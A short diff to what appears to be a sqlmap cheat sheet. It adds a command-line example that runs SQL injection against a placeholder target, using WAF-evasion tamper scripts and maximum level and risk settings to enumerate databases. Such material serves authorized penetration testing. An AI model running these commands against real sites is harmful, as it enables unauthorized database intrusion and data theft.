@@ -14,3 +14,4 @@
 Example:
 -sqlmap -u "Target.com" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --dbs
 -sqlmap -u "Target.com" --identify-waf --random-agent -v 3 --dbs
+-sqlmap -u "Target.com" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --level=5 --risk=3 --dbs
